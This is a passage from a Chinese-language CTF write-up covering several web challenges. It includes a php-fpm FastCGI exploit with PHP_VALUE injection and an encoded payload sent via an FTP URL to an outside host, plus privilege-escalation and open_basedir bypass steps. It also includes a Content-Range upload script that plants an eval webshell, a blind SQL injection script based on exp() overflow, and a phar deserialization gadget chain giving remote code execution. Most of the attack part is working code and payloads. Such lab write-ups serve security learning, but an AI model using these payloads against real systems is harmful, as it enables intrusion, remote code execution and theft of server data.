     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */
    public function request(array $params, $stdin)
    {
        $response = '';
//        $this->connect();
        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
        $paramsRequest = '';
        foreach ($params as $key => $value) {
            $paramsRequest .= $this->buildNvpair($key, $value);
        }
        if ($paramsRequest) {
            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
        }
        $request .= $this->buildPacket(self::PARAMS, '');
        if ($stdin) {
            $request .= $this->buildPacket(self::STDIN, $stdin);
        }
        $request .= $this->buildPacket(self::STDIN, '');
        echo('data='.urlencode($request));
//        fwrite($this->_sock, $request);
//        do {
//            $resp = $this->readPacket();
//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
//                $response .= $resp['content'];
//            }
//        } while ($resp && $resp['type'] != self::END_REQUEST);
//        var_dump($resp);
//        if (!is_array($resp)) {
//            throw new Exception('Bad request');
//        }
//        switch (ord($resp['content']{4})) {
//            case self::CANT_MPX_CONN:
//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
//                break;
//            case self::OVERLOADED:
//                throw new Exception('New request rejected; too busy [OVERLOADED]');
//                break;
//            case self::UNKNOWN_ROLE:
//                throw new Exception('Role value not known [UNKNOWN_ROLE]');
//                break;
//            case self::REQUEST_COMPLETE:
//                return $response;
//        }
    }
}
?>
<?php
// real exploit start here
//if (!isset($_REQUEST['cmd'])) {
//    die("Check your input\n");
//}
//if (!isset($_REQUEST['filepath'])) {
//    $filepath = __FILE__;
//}else{
//    $filepath = $_REQUEST['filepath'];
//}

$filepath = "/var/www/html/add_api.php";
$req = '/'.basename($filepath);
$uri = $req .'?'.'command=whoami';
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php system(\$_REQUEST['command']); phpinfo(); ?>"; // php payload -- Doesnt do anything
$php_value = "unserialize_callback_func = system\nextension_dir = /tmp\nextension = shell.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = ";
$params = array(
    'GATEWAY_INTERFACE' => 'FastCGI/1.0',
    'REQUEST_METHOD'    => 'POST',
    'SCRIPT_FILENAME'   => $filepath,
    'SCRIPT_NAME'       => $req,
    'QUERY_STRING'      => 'command=whoami',
    'REQUEST_URI'       => $uri,
    'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
    'PHP_VALUE'         => $php_value,
    'SERVER_SOFTWARE'   => '80sec/wofeiwo',
    'REMOTE_ADDR'       => '127.0.0.1',
    'REMOTE_PORT'       => '9001',
    'SERVER_ADDR'       => '127.0.0.1',
    'SERVER_PORT'       => '80',
    'SERVER_NAME'       => 'localhost',
    'SERVER_PROTOCOL'   => 'HTTP/1.1',
    'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
```

生成 payload

```
%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+shell.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
```

上传 /var/www/html 通过 copy 到 /tmp 目录

```
var_dump(copy("/var/www/html/shell.so",'/tmp/shell.so'));
```

然后上传信息

```
$file=$_POST['file'];$data=$_POST['data'];file_put_contents($file,$data);&file=ftp://aaa@xxx.xxx.xxx.xxx:23/123&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
```

然后反弹shell成功后, 还是查看不了 flag, 尝试提权

```
find / -perm -u=s -type f 2>/dev/null
```

发现如下指令

```
/usr/local/bin/php
```

然后使用 php -a 模式绕过 open_basedir 访问 flag

```
mkdir('hack');
chdir('hack');
ini_set('open_basedir','..');
chdir('..');chdir('..');chdir('..');
chdir('..');chdir('..');chdir('..');chdir('..');
ini_set('open_basedir','/');
var_dump(file_get_contents("/flag"));
```

## [纵横杯1st 线下赛]upload

**难点**: 主要就是代码多...考了一个特殊的 http 头 Content-Range, 用于断点续传

在 `upload.php` 的最下面发现了该文件的两个主要功能 get 和 post

```php
    # get传参的功能: 下载文件
    public function get($print_response = true) {
        if ($print_response && $this->get_query_param('download')) {
            
            return $this->download();
        }
        $file_name = $this->get_file_name_param();
        if ($file_name) {
            $response = array(
                $this->get_singular_param_name() => $this->get_file_object($file_name)
            );
        } else {
            $response = array(
                $this->options['param_name'] => $this->get_file_objects()
            );
        }
        return $this->generate_response($response, $print_response);
    }
    # post传参功能: 上传文件
    public function post($print_response = true) {
        if ($this->get_query_param('_method') === 'DELETE') {
            return $this->delete($print_response);
        }
        $upload = $this->get_upload_data($this->options['param_name']);
        // Parse the Content-Disposition header, if available:
        $content_disposition_header = $this->get_server_var('HTTP_CONTENT_DISPOSITION');

        $file_name = $content_disposition_header ?
            rawurldecode(preg_replace(
                '/(^[^"]+")|("$)/',
                '',
                $content_disposition_header
            )) : null;
        $content_range_header = $this->get_server_var('HTTP_CONTENT_RANGE');
        $content_range = $content_range_header ?
            preg_split('/[^0-9]+/', $content_range_header) : null;

        $size =  $content_range ? $content_range[3] : null;
        $files = array();
        if ($upload) {
            if (is_array($upload['tmp_name'])) {
                foreach ($upload['tmp_name'] as $index => $value) {
                    $files[] = $this->handle_file_upload(
                        $upload['tmp_name'][$index],
                        $file_name ? $file_name : $upload['name'][$index],
                        $size ? $size : $upload['size'][$index],
                        $upload['type'][$index],
                        $upload['error'][$index],
                        $index,
                        $content_range
                    );
                }
            }
        }
        $response = array($this->options['param_name'] => $files);
    }
```

很明显可以上传文件而且暂时看到没有什么过滤, 也就是要是能传上去直接就是 php 文件, 首先第一个函数  `get_upload_data`

```
    protected function get_upload_data($id) {
        return @$_FILES[$id];
    }
```

貌似就是读一下我们文件数组里的参数, 往下, 中间读了一个 `HTTP_CONTENT_RANGE` , 貌似没有就 null

```php
$content_range_header = $this->get_server_var('HTTP_CONTENT_RANGE');
$content_range = $content_range_header ?
            preg_split('/[^0-9]+/', $content_range_header) : null;
$size =  $content_range ? $content_range[3] : null;
```

往下到我们上传的文件

```php
$files = array();
if ($upload) {
	if (is_array($upload['tmp_name']))
```

可以看出上传的文件需要是数组才读取, 也就是传参的是 `files[]` , 然后继续到函数 `handle_file_upload`, 写了很多但感觉就是通过 file_put_contents 把文件传上去, 没了, 没过滤

```php
            if ($uploaded_file && is_uploaded_file($uploaded_file) && $content_range) {
                if ($append_file) {
                    file_put_contents(
                        $file_path,
                        fopen($uploaded_file, 'r'),
                        FILE_APPEND
                    );  # 追加写入
                } else {
                    move_uploaded_file($uploaded_file, $file_path);
                }
            } else {
                file_put_contents(
                    $file_path,
                    fopen($this->options['input_stream'], 'r'),
                    $append_file ? FILE_APPEND : 0
                );
            }
```

但是下面有个特殊的判断

```php
if (!$content_range && $this->options['discard_aborted_uploads']) {
	unlink($file_path);
```

没有 `$content_range` 直接给你删了...好家伙, 网上查了一下 Content-Range

>Range & Content-Range
>HTTP1.1 协议（RFC2616）开始支持获取文件的部分内容，这为并行下载以及断点续传提供了技术支持。它通过在 Header 里两个参数实现的，客户端发请求时对应的是 Range ，服务器端响应时对应的是 Content-Range 。 

简明来说也就是断点续传, 可以把一个大文件拆分传然后拼起来(我们不需要啊!!!

所以直接找了一个传大文件的头, 把我们仅有的字节传上去

```python
# -*-coding:utf-8-*-
'''
    @HTTP断点续传: Content-Range
    @Content-Range: bytes (unit first byte pos) - [last byte pos]/[entity legth]
    @Content-Range: bytes 0-800/801 //801:文件总大小
    @Range: bytes=0-499 表示第 0-499 字节范围的内容
    @Range: bytes=500-999 表示第 500-999 字节范围的内容
    @Range: bytes=-500 表示最后 500 字节的内容
    @Range: bytes=500- 表示从第 500 字节开始到文件结束部分的内容
    @Range: bytes=0-0,-1 表示第一个和最后一个字节
    @Range: bytes=500-600,601-999 同时指定几个范围
'''
import requests
import io

url = "http://13b9a8da-7777-455e-a597-687fd8e2cfcb.node3.buuoj.cn/"
headers = {"Content-Range": "bytes 0-2000/4932"}
# 读文件传参
# files = {"files[]": open("./shell.php", "rb")}
# 字节传参
files = {"files[]": ("hack.php", io.BytesIO(b"<?php eval($_POST[a]);?>"), "image/png")}
requests.post(url=url+'index.php', headers=headers, files=files)
res = requests.post(url=url+'files/hack.php', data={"a": "system('cat /flllllll1112222222lag');"})
print(res.text)
```

> 断点续传的用途
>
> 有时用户上传/下载文件需要历时数小时，万一线路中断，不具备断点续传的 HTTP/FTP 服务器或下载软件就只能从头重传，比较好的 HTTP/FTP 服务器或下载软件具有断点续传能力，允许用户从上传/下载断线的地方继续传送，这样大大减少了用户的烦恼。
>
> 常见的支持断点续传的上传/下载软件：QQ 旋风、迅雷、快车、电驴、酷6、土豆、优酷、百度视频、新浪视频、腾讯视频、百度云等。
>
> 在 Linux/Unix 系统下，常用支持断点续传的 FTP 客户端软件是 lftp。

## [HFCTF 2021 Final]hatenum

查看源码, 必须要code, 注册也是如此

```php
	function login($username,$password,$code){
		$res = $this->conn->query("select * from users where username='$username' and password='$password'");
		if($this->conn->error){
			return 'error';
		}
		else{
			$content = $res->fetch_array();
			if($content['code']===$_POST['code']){
				$_SESSION['username'] = $content['username'];
				return 'success';
			}
			else{
				return 'fail';
			}
		}
```

两个 waf

```php
function array_waf($arr){
	foreach ($arr as $key => $value) {
		if(is_array($value)){
			array_waf($value);
		}
		else{
			sql_waf($value);
			num_waf($value);
		}
	}
}
```

如下

```php
function sql_waf($str){
	if(preg_match('/union|select|or|and|\'|"|sleep|benchmark|regexp|repeat|get_lock|count|=|>|<| |\*|,|;|\r|\n|\t|substr|right|left|mid/i', $str)){
		die('Hack detected');
	}
}

function num_waf($str){
	if(preg_match('/\d{9}|0x[0-9a-f]{9}/i',$str)){
		die('Huge num detected');
	}
}
```

num_waf使得每次注入只能最多注 4 位, 拼接万能密码

```
"username": "admin\\",
"password": "||1#",
"code": "1"
```

**`select exp(709)`会达到最大值，即如果select exp(710)及以上就会报错**

![20210706104935223](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210706104935223.png)

然后改进 payload

```
"username": "admin\\",
"password": "||i&&exp(999)#",
"code": "1"
```

只要 i 的位置用来测code即可, 因为当 i = 0的时候会返回 login fail, 但当 i = 1 的时候就会触发 exp(999) 造成溢出error, 通过 rlike 匹配, 但是 rlike 不会无端地返回 1 和 0 的结果, 通过计算方式去触发

```
||exp(710-(code rlike binary 0x61))#
```

因为无法从头正则匹配, 正则中会出现类似的情况如下

```
[+]More choice 
1: erghruigh2uygh2u
2: erghruigh2uygh23
```

`gh2u` 的重复出现, 需要让数字靠前, 不然的话会无限重复 `gh2ugh2` 这一段内容, 脚本如下

```python
# -*-coding:utf-8-*-
import requests

url = "http://f74815de-25f8-44e0-b0f1-d67542307f09.node4.buuoj.cn/login.php"
# dic = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
dic = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
tem = "erg"
rel = "erg"
# code = "erghruigh2uygh23uiu32ig"

def login():
    sess = requests.session()
    data = {
        'username': "admin\\",
        'password': "||1#",
        'code': 'erghruigh2uygh23uiu32ig'
    }
    res = sess.post(url, data=data, allow_redirects=False)
    print(res.text)
    res = sess.post(url.replace('login', 'home'), data=data, allow_redirects=False)
    print(res.text)

def str2hexnum(str):
    hexhum=''
    for i in str:
        hexhum=hexhum+hex(ord(i))[2:]
    return hexhum

login()

while True:
    error = 0
    jud = str2hexnum(tem)
    for i in dic:
        _ = str2hexnum(i)
        data = {
            'username': "admin\\",
            'password': "||exp(710-(code rlike binary 0x{}))#".replace(' ', chr(0x0c)).format(jud+_),
            'code': '1'
        }
        res = requests.post(url, data=data, allow_redirects=False)

        if 'fail' in res.text:
            error = error + 1
            if error > 1:
                print("[+]More choice\n1: {}\n2: {}".format(rel, rel[:-1]+i))
            else:
                rel = rel + i
                # 向后取位
                tem = tem[1:] + i
                print(rel)
```

最后还需要将得到的两个错误的code进行猜测拼接

```
erghrui gh2uygh2
erghrui gh23uiu32ig
猜测 > erghruigh2uygh23uiu32ig
```

直接登不上去, 好家伙, 那就python请求登录访问 home.php 即可

```
if($_SESSION['username']=='admin'){
	echo file_get_contents('/flag');
}
```

拿到 flag

![20210706113608183](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210706113608183.png)

## [HFCTF 2021 Final]tinypng

看路由 web.php

```php
<?php

use Illuminate\Support\Facades\Route;

use App\Http\Controllers\IndexController;
use App\Http\Controllers\ImageController;

Route::get('/', function () {
    return view('upload');
});
Route::post('/', [IndexController::class, 'fileUpload'])->name('file.upload.post');

//Don't expose the /image to others!
Route::get('/image', [ImageController::class, 'handle'])->name('image.handle');
```

然后再看看 Controller, 上传的文件最后一定是 png (卡死了), 然后从 image.handler 这个口突破

```php
    public function handle(Request $request)
    {
        $source = $request->input('image');
        if(empty($source)){
            return view('image');
        }
        $temp = explode(".", $source);
        $extension = end($temp);
        if ($extension !== 'png') {
            $error = 'Don\'t do that, pvlease';
            return back()
                ->withErrors($error);
        } else {
            $image_name = md5(time()) . '.png';
            $dst_img = '/var/www/html/' . $image_name;
            $percent = 1;
            (new imgcompress($source, $percent))->compressImg($dst_img);
            return back()->with('image_name', $image_name);
        }
    }
```

传入 $source > 检查后缀(严格的png) > 进入else然后新建对象把我们的$source带入 > 执行 compressImg 函数

```php
    public function __construct($src, $percent = 1)
    {
        $this->src = $src;
        $this->percent = $percent;
    }
```

$source 对应对象 imgcompress 中的 $src, 然后看到函数 compressImg

```php
    private function _openImage()
    {
        list($width, $height, $type, $attr) = getimagesize($this->src);
        $this->imageinfo = array(
            'width' => $width,
            'height' => $height,
            'type' => image_type_to_extension($type, false),
            'attr' => $attr
        );
        $fun = "imagecreatefrom" . $this->imageinfo['type'];
        $this->image = $fun($this->src);
        $this->_thumpImage();
    }
```

$this->src 在 getimagesize 被调用, 可控且可以触发 phar 反序列化

考察 phar 在 gz, zip 文件下的反序列触发方式, 上来的上传文件处可以通过 `Content-Type: image/png` 直接绕过判断上传压缩文件, 后续在 /image路由进行GET传参触发 phar 反序列化即可, 生成的 exp

```php
<?php

namespace Symfony\Component\Routing\Loader\Configurator {
    class ImportConfigurator {
        private $parent;
        private $test;
        public function __construct($parent) {
            $this->parent = $parent;
            $this->test = 'undefined';
        }
    }
}

namespace Mockery {
    class HigherOrderMessage {
        private $mock;
        private $method;
        public function __construct($mock) {
            $this->mock = $mock;
            $this->method = 'generate';  // 调用 mock 类的 generate 方法
        }
    }
}

namespace PHPUnit\Framework\MockObject {
    class MockTrait {
        private $classCode;
        private $mockName;
        public function __construct($classCode) {
            $this->classCode = $classCode;
            $this->mockName = 'undefined';  // 控制 $mockname 为不存在的类
        }
    }
}

namespace {

    use Mockery\HigherOrderMessage;
    use PHPUnit\Framework\MockObject\MockTrait;
    use Symfony\Component\Routing\Loader\Configurator\ImportConfigurator;

    $c = new MockTrait("phpinfo(); echo 'Ricky in serialize!'; eval(filter_input(INPUT_GET,\"ricky\"));");
    $b = new HigherOrderMessage($c);
    $a = new ImportConfigurator($b);

    if(file_exists('phar.phar.gz')) {
        @unlink("phar.phar");
        @unlink("phar.phar.gz");
    }
    $phar=new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub('GIF89a'."__HALT_COMPILER();");
    $phar->setMetadata($a);
    $phar->addFromString("test.txt", "test");
    $phar->stopBuffering();
    system('gzip phar.phar');
}
```

访问

```
/image?image=phar://../storage/app/uploads/09f7f0ddb898c813bd127ffcc5b254ca.png&ricky=system('cat%20/f*');
```

得到 flag

![20210705223629635](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210705223629635.png)


